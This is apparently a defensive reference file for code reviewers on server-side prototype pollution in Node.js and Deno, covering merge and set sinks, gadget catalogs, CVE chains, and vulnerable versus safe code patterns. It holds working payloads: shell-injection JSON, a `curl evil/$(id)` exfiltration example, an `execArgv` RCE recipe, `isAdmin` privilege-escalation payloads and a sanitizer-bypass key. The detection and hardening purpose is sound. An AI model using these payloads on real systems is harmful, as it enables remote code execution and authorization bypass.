---
name: server_side_prototype_pollution
description: Server-Side Prototype Pollution (SSPP) — pollution sinks (merge / clone / set / qs nested-bracket parsers) and the Node.js / Deno / NPM gadget catalog that escalates pollution to RCE, ACI, SSRF, path traversal, privilege escalation, and DoS
---

# Server-Side Prototype Pollution (SSPP)

**CWE coverage**: CWE-1321 (primary, *Improperly Controlled Modification of Object Prototype Attributes*) plus the downstream CWEs your gadget actually lands — prototype-pollution detection maps to **CWE-78** (OS command injection), **CWE-79** (XSS), **CWE-94** (code injection), **CWE-400** (resource exhaustion), **CWE-471** (modification of assumed-immutable data), **CWE-915** (mass assignment). Choose the downstream CWE that matches the gadget reached.

Server-Side Prototype Pollution lets an attacker write to `Object.prototype` (or another shared prototype) on the server. Because every plain JavaScript object inherits from `Object.prototype`, a single polluted key changes the *default* value seen by every undefined-property read in the entire process. SSPP itself is rarely the impact — it is an **amplifier**: pollution becomes RCE, SSRF, command injection, path traversal, privilege escalation, or DoS only when combined with a downstream **gadget**, i.e. existing code that reads an undefined property and uses it as a security-sensitive parameter (`shell`, `env.NODE_OPTIONS`, `hostname`, `socketPath`, `cwd`, `mode`, `escapeFunction`, `sourceURL`, etc.).

**Impact-class pivots** (report severity and triage the gadget under the class it actually lands): code/command execution → `rce.md`; outbound-request gadgets (`socketPath`, `fetch` options) → `ssrf.md`; file-path gadgets (`cwd`, archive `uid/gid`, LFI chains) → `path_traversal_lfi_rfi.md`; ACL/flag gadgets (`if (user.<flag>)`, `isAdmin`) → `privilege_escalation.md` / `mass_assignment.md`; template-compile gadgets (`outputFunctionName`, `sourceURL`) → `ssti.md`.

A vulnerable application therefore needs two things to be exploitable:

1. **A pollution sink** — a place where attacker-controlled keys flow into a write of the form `target[__proto__][key] = value`, `target.constructor.prototype[key] = value`, or `target.prototype[key] = value`. This is most commonly a recursive merge / deep-clone / `_.set` / nested-query-string parser / JSON deserializer.
2. **A gadget** — code (in the app, Node.js stdlib, Deno stdlib, or an installed NPM package) that reads an undefined property after the pollution and uses it for a security-sensitive operation. Prototype-pollution gadget research has catalogued dozens of these in stdlib and popular packages.

---

## Where to Look

**Pollution sinks (writes)**
- Recursive merge / deep-merge utilities: `lodash.merge`, `lodash.mergeWith`, `lodash.defaultsDeep`, `lodash.set`, `lodash.setWith`, `lodash.zipObjectDeep`, `_.assignWith`, `_.update`/`_.updateWith`, `merge`/`deepmerge`/`merge-deep`/`merge-objects`, `extend` (juliangruber/extend), `just-extend`, `merge.recursive`, `jQuery.extend(true, target, src)` server-side, `Hoek.merge`, `Hoek.applyToDefaults`, custom `function merge(a, b) { for (k in b) ... }` loops
- Property-path setters: `lodash.set(obj, userPath, userVal)`, `_.setWith`, `dottie.set`, custom `path.split('.').reduce(...)` reducers
- Key-expanders / "unflatten" utilities that rebuild nested objects from dotted or bracketed keys: `flat`'s `unflatten()` (expands `{"__proto__.x":1}` / `{"a.__proto__.x":1}` into nested writes — the `flat`/Hack-The-Box "Gunship" CTF pattern, and the library behind Kibana CVE-2019-7609), `dot-prop` `set`, `object-path` `set`/`ensureExists`, `flatley`, `deepdash`
- Query-string parsers that auto-build nested objects from bracket notation: `qs` (when `allowPrototypes` is not set to `false` *and* default `arrayLimit` / `depth` permit nesting), `expressjs/express` body-parser when `extended: true`, old `query-string` versions, custom `?a[b][c]=d` parsers
- File-upload middlewares that auto-build nested objects: `express-fileupload` with `parseNested: true` (CVE-2020-7699)
- JSON deserialization followed by deep-copy/merge into config or session objects (raw `JSON.parse(req.body)` is *not* by itself a sink — `__proto__` becomes an own property of the parsed object, not the prototype chain — but a subsequent `_.merge`/recursive-copy into a real object IS a sink)
- Yaml / TOML / BSON / EDN parsers configured to coerce keys into prototype mutations
- ORM-level "mass assignment" + nested update calls (`Model.update({...req.body})` where the ORM internally deep-merges)
- MongoDB-style operator filters that allow `$set` with attacker-controlled keys (`$set: { __proto__.foo: 'bar' }`)

**Gadgets (reads)**
- Anywhere Node.js / Deno / a third-party package reads an option object and falls back to a default when an option is *undefined*. Polluting `Object.prototype.<option>` causes the read to return the polluted value instead of `undefined`, silently changing behavior.

**Frameworks / runtimes most affected**
- Express, Koa, Fastify, NestJS, Next.js (server runtime), Blitz.js, Hapi, Sails, Meteor, Parse Server, Strapi, Kibana, Rocket.Chat
- Deno (separate stdlib gadget surface)
- Bun and Cloudflare Workers — different per-runtime stdlib, treat as Node-adjacent

---

## Core Mechanic

```javascript
// 1) attacker delivers a payload that survives the parser
//    and reaches a recursive-merge sink:
JSON.parse('{"__proto__": {"shell": "/bin/sh -c \\"id\\""}}')
// or a nested-bracket query string:
?__proto__[shell]=%2Fbin%2Fsh%20-c%20%22id%22

// 2) sink performs a recursive copy that walks attacker keys:
_.merge({}, parsedBody);   // or _.defaultsDeep, _.set, custom merge

// 3) Object.prototype.shell is now "/bin/sh -c \"id\"".
({}).shell // → "/bin/sh -c \"id\""

// 4) gadget reads an undefined option, gets the polluted default:
require("child_process").execSync("ls", {});
// `options.shell` was undefined → resolved via prototype chain →
// child_process spawns /bin/sh -c "id" instead of the default shell
```

---

## Source -> Sink Pattern

**Sources** (attacker-controlled `__proto__` / `constructor.prototype` / `prototype` key)
- HTTP request bodies (`req.body`, `request.json()`, Koa `ctx.request.body`)
- Query strings parsed into nested objects (`req.query` when `extended: true`)
- URL params with bracket notation (`?a[__proto__][shell]=...`)
- File upload field names (`express-fileupload` `parseNested`)
- WebSocket / SSE messages, GraphQL variables, gRPC payloads, MQTT, AMQP
- BSON / MessagePack / CBOR / YAML payloads from clients
- Cookies that are JSON-decoded then merged into config
- Database documents under attacker control (when admin/CMS lets users edit JSON)

**Sinks** (the merge/set/parse call)

```javascript
// Lodash family — VULNERABLE on default settings prior to security patches
_.merge(target, attackerJSON)
_.mergeWith(target, attackerJSON, customizer)
_.defaultsDeep(target, attackerJSON)
_.set(target, attackerPath, attackerVal)            // when attackerPath includes '__proto__.x' or 'constructor.prototype.x'
_.setWith(target, attackerPath, attackerVal, ...)
_.zipObjectDeep(attackerKeys, attackerVals)
_.update(target, attackerPath, fn)

// Standalone deep-merge libraries
require('deepmerge')(target, attackerJSON)          // pre-4.2.x and unsafe options
require('merge-deep')(target, attackerJSON)
require('merge')(target, attackerJSON)
require('hoek').merge(target, attackerJSON)
require('hoek').applyToDefaults(defaults, attackerJSON)

// Hand-rolled recursive merge
function merge(a, b) {
  for (const k in b) {                              // also walks inherited keys
    if (typeof b[k] === 'object') merge(a[k], b[k]);
    else a[k] = b[k];
  }
}
merge(target, attackerJSON)                          // VULN

// qs / express body-parser
qs.parse('a[__proto__][shell]=/bin/sh', { allowPrototypes: true })  // explicit opt-in
qs.parse(rawQS)                                                      // some versions vulnerable in defaults
app.use(express.urlencoded({ extended: true }))                      // historically vulnerable

// express-fileupload (CVE-2020-7699)
fileUpload({ parseNested: true })

// Custom path setter
function setProp(obj, path, val) {
  const keys = path.split('.');
  let o = obj;
  for (let i = 0; i < keys.length - 1; i++) o = o[keys[i]] ||= {};
  o[keys.at(-1)] = val;
}
setProp(target, '__proto__.shell', '/bin/sh -c "id"')                // VULN

// flat / unflatten key-expander (Gunship CTF / Kibana CVE-2019-7609 class)
const { unflatten } = require('flat');
unflatten(req.body)            // VULN — { "__proto__.x": 1 } → Object.prototype.x = 1
```

---

## Pollution → RCE / Auth Bypass / DoS Escalation Chain

SAST triage requires source → sink → gadget read in the **same process**. Pair downstream CWE to the gadget reached.

| Stage | What to find | Server indicator |
|-------|--------------|------------------|
| Source | Attacker JSON/config in request | `req.body`, `req.query` (extended qs), upload field names, WS/GraphQL variables |
| Sink | Recursive merge or path setter into real object | `_.merge`, `_.set`, `defaultsDeep`, hand-rolled `for…in`, nested-bracket qs parse |
| Gadget read | Undefined option/flag resolved via prototype | `options.shell`, `user.isAdmin`, `canDelete`, template `sourceURL`, `evalFunctions` |
| Impact class | Stdlib/NPM/app logic uses polluted default | RCE (`child_process`, `execArgv`), auth bypass (`isAdmin`), DoS (`backlog`, `indent`) |

```javascript
// JSON body → config merge → auth bypass (business-logic gadget)
app.post('/api/prefs', (req, res) => {
  _.merge(sharedConfig, req.body);                    // VULN — {"__proto__":{"isAdmin":true}}
});
function authorize(user) { return user.isAdmin === true; }  // gadget → privesc
```

```javascript
// JSON body → merge → RCE (stdlib gadget)
_.merge({}, JSON.parse(req.body));                    // VULN
child_process.execSync('ls', {});                     // reads polluted options.shell / env.NODE_OPTIONS
```

Config-object pollution (`_.merge(appConfig, req.body)`, env-loader merges, session-store hydration) is the dominant server pattern — trace any HTTP-bound object into shared/long-lived config before handler return.

---

## Vulnerable Pollution Patterns

### Pattern 1 — Recursive merge with attacker-controlled JSON

```javascript
// VULN — Express body merged into config
app.post('/save-prefs', (req, res) => {
  _.merge(userConfig, req.body);                    // pollution sink
  res.send('ok');
});
// payload: { "__proto__": { "shell": "/bin/sh -c \"curl evil/$(id)\"" } }
```

### Pattern 2 — `_.set` / `_.setWith` with attacker-controlled path

```javascript
// VULN — Lodash set with user path
const path = req.body.path;       // e.g., "__proto__.foo"
const value = req.body.value;
_.set(profile, path, value);      // walks the path into Object.prototype
```

### Pattern 3 — `qs` / `express.urlencoded({ extended: true })`

```javascript
// VULN — extended qs parser turns ?a[__proto__][b]=c into nested writes
app.use(express.urlencoded({ extended: true }));
app.post('/cfg', (req, res) => {
  Object.assign(config, req.body);                  // shallow copy — but…
  // qs already produced { a: { __proto__: { b: "c" } } } during parsing
});
```

`qs`'s default *array* behavior is hardened, but its nested-object parsing followed by a downstream `_.merge`/`Object.assign(into, into.__proto__)` chain remains a real pollution path.

### Pattern 4 — Hand-rolled recursive merge using `for…in`

```javascript
// VULN — for…in walks inherited keys; copying b[k] into a[k]
//        without an own-property guard pollutes
function deepMerge(a, b) {
  for (const k in b) {
    if (typeof b[k] === 'object' && b[k] !== null) {
      a[k] = a[k] || {};
      deepMerge(a[k], b[k]);
    } else {
      a[k] = b[k];
    }
  }
  return a;
}
deepMerge({}, JSON.parse(req.body));                // VULN
```

### Pattern 5 — JSON.parse + property-path reducer

```javascript
// VULN — split('.') then reduce into dotted path
const { key, value } = JSON.parse(req.body);
key.split('.').reduce((acc, k, i, arr) => {
  if (i === arr.length - 1) acc[k] = value;
  return (acc[k] ??= {});
}, target);
// key = "__proto__.shell"  →  Object.prototype.shell = value
```

### Pattern 6 — File upload field name pollution

```javascript
// VULN — express-fileupload <= 1.1.6 with parseNested
app.use(fileUpload({ parseNested: true }));         // CVE-2020-7699
// curl -F 'file=@x;__proto__[shell]=/bin/sh' causes pollution
```

### Pattern 7 — MongoDB / NoSQL operator pollution

```javascript
// VULN — passing untrusted update operators
db.users.updateOne({ _id }, req.body);              // body: { $set: { "__proto__.x": 1 } }
// On in-memory drivers / ODMs that materialize the update doc client-side,
// this reaches a recursive merge.
```

### Pattern 8 — Deserialization libraries (BSON, YAML, EDN)

```javascript
// VULN — bson with evalFunctions:true, polluted via merged options
BSON.deserialize(buffer, options);                  // options.evalFunctions polluted → ACE
// (see Parse Server CVE-2022-24760 / -39396 / -41878 / -41879 / -36475)
```

### Pattern 9b — NestJS / `class-transformer.plainToClass`

NestJS commonly deserializes request bodies into DTO classes via `class-transformer.plainToClass` / `plainToInstance`. With default options, unknown keys on the source object are dropped, but `excludeExtraneousValues: false` (the default) or a custom transform that recursively walks nested objects pairs poorly with `_.merge`-style helpers inside service classes:

```typescript
// VULN — DTO bypass via __proto__ + downstream deep merge
@Post('profile')
update(@Body() body: UpdateProfileDto) {
  // body is a UpdateProfileDto instance; class-transformer dropped unknown keys
  // BUT body still has __proto__ as an own property if the request was JSON-parsed
  // and downstream service uses _.merge(this.userConfig, body)
  this.users.applyConfig(body);  // service performs recursive merge → pollution
}
```

The safe pattern is to combine `class-validator` `@IsString()` / `@IsObject()` decorators with the `whitelist: true` + `forbidNonWhitelisted: true` `ValidationPipe` global config — this rejects any payload containing `__proto__` outright.

```typescript
// SAFE — NestJS global ValidationPipe with strict whitelist
app.useGlobalPipes(new ValidationPipe({
  whitelist: true,
  forbidNonWhitelisted: true,
  forbidUnknownValues: true,
  transform: true,
  transformOptions: { excludeExtraneousValues: true },
}));
```

### Pattern 9c — Fastify schema-based defense (built-in)

Fastify validates `body` / `query` / `params` against a JSON schema via Ajv before the handler runs. When schemas are declared and `additionalProperties: false` (the default for `removeAdditional: 'all'`) is configured, attacker-supplied `__proto__` keys are stripped *before* the request reaches user code:

```typescript
// SAFE — Fastify route with strict schema (default Ajv config strips unknown keys)
fastify.post('/users', {
  schema: {
    body: {
      type: 'object',
      additionalProperties: false,
      required: ['name'],
      properties: { name: { type: 'string' } },
    },
  },
}, async (request) => {
  // request.body is schema-validated and stripped — pollution attempts are gone
  return userService.create(request.body);
});
```

This is the most effective framework-level defense against SSPP available out-of-the-box. Recommend it in remediation guidance for any Fastify app.

### Pattern 10 — GraphQL resolvers passing `args` to a merge

```typescript
// VULN — GraphQL args spread into a merge without schema-level rejection
const resolvers = {
  Mutation: {
    updateUser: (_, args, ctx) => {
      _.merge(ctx.user, args.input);     // args.input may contain __proto__
      return ctx.user;
    },
  },
};
```

Many GraphQL servers (Apollo, Mercurius, GraphQL Yoga) do NOT strip `__proto__` from input scalar values by default — schema-level `input` types validate the *shape* but allow extra keys to pass through if the input type uses a `JSON` / `JSONObject` custom scalar.

### Pattern 11 — ORM `.update()` / `.upsert()` with attacker body (Sequelize / TypeORM / Mongoose / Prisma)

```javascript
// VULN — Sequelize
await User.update(req.body, { where: { id } });

// VULN — TypeORM
await userRepository.update(id, req.body);

// VULN — Mongoose
await User.findByIdAndUpdate(id, req.body);
```

When the ORM internally walks attacker-controlled keys through a recursive merge (Mongoose `$set`/nested-update operators are the most exposed), a `__proto__` payload can reach the prototype. Defense: explicit field allowlist or DTO-validation pipe *before* the ORM call; Prisma's strict-typed model interfaces are immune unless `Prisma.JsonValue` is used for an attacker-controlled column.

### Pattern 9 — Application-level authorization / feature flags (business-logic gadget)

The "gadget" does not have to live in stdlib or a dependency — application-level boolean/role checks that read an *undefined* property and then trust a fallback are themselves gadgets. This is the canonical privilege-escalation via SSPP pattern (auth bypass via `__proto__: { canDelete: true }`).

```javascript
// VULN — business-logic gadget reading an undefined permission flag
function canDeleteMessage(user) {
  return user.canDelete === true;                   // user.canDelete is undefined → resolved via prototype chain
}
// payload that lands the gadget:
//   {"auth": {...}, "message": {"text": "hi", "__proto__": {"canDelete": true}}}
//   merged into a real user record by _.merge → Object.prototype.canDelete = true
//   → every user (including unauthenticated ones, depending on shape) returns true here.
```

```javascript
// VULN — same shape with isAdmin / role
function isAdminRequest(req) {
  return req.user.isAdmin;                          // undefined own → polluted prototype default
}
// payload:  { ..., "__proto__": { "isAdmin": true } }
```

These gadgets exist in almost every Express/Koa/Fastify app that does ACL checks via plain object property reads. Treat any `if (user.<flag>)` / `if (req.<flag>)` style check downstream of a merge sink as a CRITICAL gadget surface — it does not require a stdlib RCE chain to reach impactful authorization bypass.

---

## Gadget Catalog — Node.js Stdlib

These gadgets fire when `Object.prototype.<key>` is polluted *and* the application later calls the corresponding API with an options object that does NOT explicitly set `<key>`. Catalogued from prototype-pollution gadget research.

| API | Polluted property | Impact | Notes |
|-----|-------------------|--------|-------|
| `child_process.exec` | `NODE_OPTIONS` (via `env.NODE_OPTIONS`) | ACI / RCE | Connect via shell.js gadget |
| `child_process.execFile` | `NODE_OPTIONS` | ACI / RCE | |
| `child_process.execFileSync` | `shell`; `NODE_OPTIONS`; `input` (Win) | ACI / RCE | Windows variant uses `input` |
| `child_process.execSync` | `shell`; `env`; `NODE_OPTIONS`; `input` (Win) | ACI / RCE | Linux variant via `shell;env` (Kibana CVE-2019-7609) |
| `child_process.fork` | `NODE_OPTIONS` | ACI / RCE | |
| `child_process.spawn` | `shell`; `env`; `input` (Win) | ACI / RCE | |
| `child_process.spawnSync` | `shell`; `env`; `NODE_OPTIONS`; `input` (Win) | ACI / RCE | |
| `worker_threads.Worker` (constructor) | `argv`; `env`; `eval` | Second-order ACE / env injection | |
| `child_process.fork` / process spawn paths reading `process.execArgv` | `execArgv` (e.g., `["--eval=require('child_process').execSync('...')"]`) | **ACE / RCE** | The canonical SSPP-to-RCE chain. Pollute `Object.prototype.execArgv` with a `--eval=…` array; any later child Node process the app spawns picks up the polluted argv and evaluates the attacker's JS in the child. Works whenever the app forks a worker after pollution and does not pass an explicit `execArgv: []`. |
| `require(...)` | `main`; `NODE_OPTIONS` | ACI / RCE | Requires absent `main` in package.json (fixed in v18.19.0) |
| `import(...)` (dynamic ESM) | `source` | ACE | |
| `fetch(url, options)` | `method`; `body`; `referrer` | Privilege Escalation (header/body smuggling) | |
| `fetch(url, options)` | `socketPath` | SSRF / IPC pivot | |
| `http.get` / `http.request` | `hostname`; `headers`; `method`; `path`; `port` | SSRF | |
| `https.get` / `https.request` | + `NODE_TLS_REJECT_UNAUTHORIZED` | SSRF + TLS validation bypass | |
| `tls.connect` | `path`; `port`; `NODE_TLS_REJECT_UNAUTHORIZED` | Second-order SSRF + TLS bypass | |
| `http.Server.listen` | `backlog` | Crash / segfault | |

`shell.js` here refers to the technique where a polluted `shell` (path to a shell binary) chained with a polluted `NODE_OPTIONS=--require=/tmp/x` lands code execution; see the documented `child_process` shell PoC.

---

## Gadget Catalog — Deno Stdlib

| API | Polluted property | Impact | Notes |
|-----|-------------------|--------|-------|
| `fetch` | `body`; `headers`; `method`; `0` | SSRF | bounded by `--allow-net` |
| `Worker` | `env`/`ffi`/`hrtime`/`net`/`read`/`run`/`sys`/`write` | Privilege Escalation (sandbox capability grant) | |
| `Deno.makeTempDir` / `Sync` | `dir`; `prefix` | Path Traversal | bounded by `--allow-write`; `prefix` was unbounded prior to v1.41.1 (CVE-2024-27931) |
| `Deno.makeTempFile` / `Sync` | `dir`; `prefix` | Path Traversal | same CVE applies |
| `Deno.mkdir` / `Sync` | `mode` | Privilege Escalation (chmod) | options must be defined |
| `Deno.open` / `Sync` | `append`; `mode`; `truncate` | Unauthorized modification / privesc | |
| `Deno.writeFile`, `writeFileSync`, `writeTextFile`, `writeTextFileSync` | `append`; `mode` | Unauthorized modification / privesc | applies to existing files too |
| `Deno.run`, `Deno.Command` | `cwd`; `uid`; `gid` | Path traversal / privesc | |
| `node:child_process.spawn` (in Deno-Node compat) | `shell`; `env`; `uid`; `gid` | ACE | bounded by `--allow-run` |
| `node:fs.appendFile` / `writeFile` | `length`; `offset` | Hanging / OOM | not a real "option" — cannot be patched |
| `node:http.request` / `https.request` | `hostname`; `method`; `path`; `port` | SSRF | bounded by `--allow-net` |
| `node:zlib.createBrotliCompress` | `params` | Panic / DoS | |
| `std/json.JsonStringifyStream` | `prefix`; `suffix` | Output tampering | |
| `std/log.FileHandler` | `formatter` | Log pollution / log injection | |
| `std/dotenv.load` / `loadSync` | `defaultsPath`; `envPath`; `export`; *any* | Env injection | |
| `std/tar.Tar.append` | `uid`; `gid` | Privilege escalation in extracted archives | |
| `std/yaml.stringify` | `indent` | OOM | |

---

## Gadget Catalog — NPM Packages (selected high-impact)

| Package | Version | Function | Polluted property | Impact |
|---------|---------|----------|-------------------|--------|
| `lodash.template` | 4.5.0 | `lodash.template(...)` | `sourceURL` | ACE — Kibana RCE chain |
| `bson` | 4.7.2 | `deserialize(...)` | `evalFunctions` | ACE — Parse Server CVE-2022-24760 / -39396 / -41878 / -41879 / -36475; Rocket.Chat CVE-2023-23917 |
| `ejs` | 3.1.9 | `render(...)` | `client`; `escapeFunction` | ACE |
| `ejs` | 2.7.4 | `renderFile` | `escape`; `client`; `destructuredLocals` | ACE |
| `pug` | all + 3.0.2 | `Template` / `compile` | `block`; `code`; `attrs`; `val` | ACE |
| `handlebars` | 4.5.2 | `ret` | `type`; `body` | ACE |
| `jade` | 1.11.0 | `renderFile` | `code`; `block`; `self` | ACE |
| `node-blade` | 3.3.1 | `compile` | `code`/`include`/`output`/`itemAlias`/`templateNamespace`/`line`/`exposing` | ACE |
| `squirrelly` | 8.0.8 | `renderFile` | `settings`; `n` | ACE |
| `dustjs` | 3.0.1 | `render` | `title` | XSS (template-engine) |
| `saker` | 1.1.1 | `compile` | `$saker_raw$`; `str` | XSS |
| `ect` (+coffee) | 0.5.9 / 1.12.7 | `ECT` | `indent`; `filename`; `inlineMap` | ACE |
| `doT` | 1.1.3 | `process` | `global`; `destination` | ACE / FileIO |
| `ractive.js` | 1.4.2 | `toHTML` | `statics` | ACE |
| `mote` | 0.2.0 | `compile` | *any key* | ACE |
| `hamlet` | 0.3.3 | `hamlet(...)` | `filename`; `variable` | ACE |
| `cross-spawn` | 7.0.3 | `spawn` / `spawn.sync` | `shell`; `NODE_OPTIONS` | ACI |
| `nodemailer` | 6.9.1 | `sendMail` | `sendmail`; `path`; `args` | ACI — Kibana CVE-2023-31415 |
| `nodemailer` | 6.9.x | `sendMail` | `cc`; `bcc` | Email interception / sensitive-data exfiltration — attacker silently added as a recipient on every message |
| `axios` | config-merge (all) | `axios.create` / `request` / `get` / `post` | `baseURL`; `proxy` | SSRF / data exfiltration — polluted `baseURL` redirects relative-path requests to an attacker host (leaking API keys / bearer tokens in the path/headers); polluted `proxy` routes outbound HTTP through an attacker-controlled proxy. axios merges per-request config over instance defaults, so an unset `baseURL`/`proxy` resolves via the prototype |
| `forever-monitor` | 3.0.3 | `start` | `command` | ACI |
| `chrome-launcher` | 0.15.2 | `launch` | `shell`; `NODE_OPTIONS` | ACI |
| `gh-pages` | 5.0.0 | `publish` | `shell`; `NODE_OPTIONS` | ACI |
| `download-git-repo` | 3.0.2 | (default) | `clone`; `GIT_SSH_COMMAND` | ACI |
| `git-clone` | 0.2.0 | (default) | `GIT_SSH_COMMAND` | ACI |
| `gm` | 1.25.0 | `gm(...)` | `appPath` | ACI |
| `growl` | 1.10.5 | `growl(...)` | `exec` | ACI |
| `python-shell` | 5.0.0 | `runString` | `pythonPath`; `NODE_OPTIONS` | ACI |
| `sonarqube-scanner` | 3.0.1 | (default) | `version` | ACI |
| `binary-parser` | 2.2.1 | `parse` | `alias` | ACE |
| `csv-write-stream` | 2.0.0 | `end` | `separator` | ACE |
| `tingodb` | 0.6.1 | `findOne` | `_sub` | ACE |
| `dockerfile_lint` | 0.3.4 | `DockerFileValidator` | `arrays.regex` | ACE |
| `better-queue` | 3.8.12 | `push` | `store` | LFI* (requires attacker-controlled local file) |
| `fluent-ffmpeg` | 2.1.2 | `preset` | `presets` | LFI* |
| `crawler` | 1.4.0 | `queue` | `repo` | LFI* |
| `dtrace-provider` | 0.8.5 | `require` | *any* | LFI* |
| `esformatter` | 0.11.3 | `format` | `plugins` | LFI |
| `hbsfy` | 2.8.1 | `configure` / `compile` | `p` | LFI |
| `primus` | 8.0.7 | `parser` / `transformer` | `parser`/`transformer`; `value` | LFI |
| `require-from-string` | 2.0.2 | (default) | `prependPaths` | LFI* |

`*` = exploitation requires the attacker to also place a local file in a known location (chained gadgets).

Recheck for newly disclosed gadgets before triage; new gadgets are added as research progresses.

---

## Real-World Exploit Chains

| CVE / Report | Application | Version | Chain |
|--------------|-------------|---------|-------|
| CVE-2018-16487 | `lodash` | < 4.17.11 | `_.merge` / `_.mergeWith` / `_.defaultsDeep` deep-merge with attacker JSON pollutes `Object.prototype`; the canonical merge-sink CVE (auth bypass via `__proto__: { canDelete: true }`) |
| CVE-2019-7609 | Kibana | 6.6.0 | Pollution → `child_process.spawn` (Linux) → RCE |
| Kibana RCE chain | Kibana | 7.6.2 / 7.7.0 | Pollution → `lodash.template.sourceURL` → RCE |
| CVE-2022-24760 / -39396 / -41878 / -41879 / -36475 | Parse Server | 4.10.6 / 5.3.1 / 6.2.1 | Pollution → `bson.evalFunctions` → RCE |
| CVE-2023-23917 | Rocket.Chat | 5.1.5 | Pollution → `bson.evalFunctions` → RCE |
| CVE-2023-31414 | Kibana | 8.7.0 | Pollution → `require.main` → RCE |
| CVE-2023-31415 | Kibana | 8.7.0 | Pollution → `nodemailer` → ACI |
| CVE-2020-7699 | `express-fileupload` | <= 1.1.6 | `parseNested` field-name pollution |
| Blitz.js report | Blitz.js | (see report) | Body pollution → template gadget → RCE |
| npm CLI | npm CLI | 8.1.0 | Pollution → `child_process.spawn` → RCE |

---

## Detection Rules

### JavaScript / TypeScript Source Patterns

**VULN — recursive merge of attacker JSON into a real object**
```javascript
_.merge(target, req.body)                         // VULN
_.mergeWith(target, req.body, fn)                 // VULN
_.defaultsDeep(target, req.body)                  // VULN
require('deepmerge')(target, req.body)            // VULN unless safe variant configured
require('hoek').merge(target, req.body)           // VULN
require('hoek').applyToDefaults(defaults, req.body) // VULN
```

**VULN — `_.set` / `_.setWith` with user-controlled path**
```javascript
_.set(obj, req.body.path, req.body.value)         // VULN: path may be "__proto__.x"
_.setWith(obj, req.body.path, req.body.value, _) // VULN
```

**VULN — Express with `extended: true` urlencoded body parser AND a downstream merge**
```javascript
app.use(express.urlencoded({ extended: true }));
// elsewhere:
_.merge(cfg, req.body)                            // VULN (qs nested-bracket → __proto__)
```

**VULN — Hand-rolled merge using `for…in` without `Object.hasOwn`**
```javascript
function merge(a, b) {
  for (const k in b) {                            // walks inherited
    if (typeof b[k] === 'object') merge(a[k] = a[k] || {}, b[k]);
    else a[k] = b[k];
  }
}
```

**VULN — split-and-reduce path setter**
```javascript
key.split('.').reduce((acc, k, i, arr) => {
  if (i === arr.length - 1) acc[k] = value;
  return (acc[k] ??= {});
}, target);                                       // VULN if `key` is user-controlled
```

**VULN — `express-fileupload` with `parseNested`**
```javascript
fileUpload({ parseNested: true })                 // VULN (CVE-2020-7699 class)
```

**SAFE — keys are checked or copy is shallow with allowlist**
```javascript
const allowed = new Set(['name', 'email']);
for (const k of Object.keys(req.body)) if (allowed.has(k)) target[k] = req.body[k];
```

**SAFE — `Object.create(null)` for any object that ever holds attacker data**
```javascript
const target = Object.create(null);              // no prototype, pollution has nothing to write
```

**SAFE — `JSON.parse` reviver that strips dangerous keys**
```javascript
JSON.parse(raw, (k, v) => k === '__proto__' || k === 'constructor' || k === 'prototype' ? undefined : v);
```

**VULN — single-pass *substring* strip is NOT a real sanitizer (recursive-strip bypass)**

A blocklist that *removes* the substring `__proto__`/`constructor` once (rather than rejecting the whole key with an equality check) is bypassable: a duplicated/nested key reconstitutes the dangerous token after the single pass. Treat any `replace(/__proto__/…/, '')`-style "sanitizer" upstream of a merge as **VULN**, not SAFE.

```javascript
// VULN — strips once, then merges; attacker key survives the strip
key = key.replace(/__proto__/g, '').replace(/constructor/g, '');   // single pass
// attacker sends:  {"__pro__proto__to__": {"isAdmin": true}}
//   "__pro__proto__to__".replace(/__proto__/g,'') === "__proto__"  → pollution
// also defeats constructor strip:  {"constconstructorructor": {"prototype": {...}}}
```

Safe alternatives: reject the *whole* key with an equality check (`key === '__proto__'`), use a destination own-property guard, or loop the strip until the string stops changing (`while (k !== (k = k.replace(/__proto__|constructor|prototype/g,''))) ;`). Equality-based blocklists are not affected by this bypass — only substring removal is.

**SAFE — `Object.freeze(Object.prototype)` at process start**
```javascript
Object.freeze(Object.prototype);                  // gadget reads still hit prototype, but writes throw in strict mode
```

**SAFE — explicit guard inside merge (source-side allowlist)**
```javascript
function safeMerge(a, b) {
  for (const k of Object.keys(b)) {
    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
    if (typeof b[k] === 'object' && b[k] !== null) safeMerge(a[k] ||= {}, b[k]);
    else a[k] = b[k];
  }
}
```

**SAFE — destination-side own-property guard (recommended structural guard)**
Recursing only when the destination already has the key as its *own* property is a stronger structural guard than a `__proto__`/`constructor` blocklist because it eliminates the entire class of "walk into `Object.prototype` via any inherited key" — not just the two well-known ones.
```javascript
function merge(dst, src) {
  for (const key in src) {
    if (!Object.hasOwn(src, key)) continue;
    if (Object.hasOwn(dst, key) && isObject(dst[key])) {
      merge(dst[key], src[key]);                    // recurse only into own properties of dst
    } else {
      dst[key] = src[key];                          // shallow assign for new keys
    }
  }
}
```

**SAFE — explicit blocklist combined with own-property guard**
```javascript
function merge(dst, src) {
  for (const key in src) {
    if (!Object.hasOwn(src, key)) continue;
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    if (isObject(dst[key])) merge(dst[key], src[key]);
    else dst[key] = src[key];
  }
}
```

**SAFE — `Map` / `Set` for dynamic key stores**

```javascript
const opts = new Map();                               // no prototype-chain lookup on keys
opts.set(userKey, userValue);
```

Use instead of plain objects when indexing by attacker-controlled strings (feature flags, plugin registry, rate-limit buckets).

**SAFE — JSON Schema validation at request boundary (generic)**

Any framework validator (Ajv, `express-validator`, NestJS `ValidationPipe`, Fastify schema) with strict `additionalProperties: false` / whitelist strips `__proto__` before handler code runs. Pair with `forbidNonWhitelisted: true` where available.

```javascript
// Ajv — strip unknown keys including __proto__
const validate = ajv.compile({ type: 'object', additionalProperties: false, properties: { name: { type: 'string' } } });
if (validate(req.body)) applyUpdate(validate.errors ? null : req.body);
```

Schema validation does not protect downstream `_.merge(validatedBody, unvalidatedSibling)` — validate the object actually merged.

**SAFE — `structuredClone` instead of recursive merge for copy**

```javascript
const copy = structuredClone(safeSubset);             // no prototype-chain walk; not a merge
```

**Runtime hardening — `--disable-proto=delete` (Node.js)**

Launch flag removes `__proto__` accessor — defense-in-depth only; `constructor.prototype` pollution remains possible. Do not treat as sole mitigation.

### VULN — lodash merge/set on raw request JSON or config

```javascript
_.merge(appConfig, req.body);                         // VULN — primary SSPP anti-pattern
_.set(settings, req.body.path, req.body.value);       // VULN — path may be "__proto__.shell"
_.defaultsDeep(sessionStore, JSON.parse(rawCookie));  // VULN — cookie JSON → shared store
```

Never deep-merge attacker JSON into process-wide config, session objects, or ORM update docs without key allowlist or prototype-less target.

### Express / Koa / Fastify entry-point heuristics

A finding is much more confident when ALL three are present in the same code path:

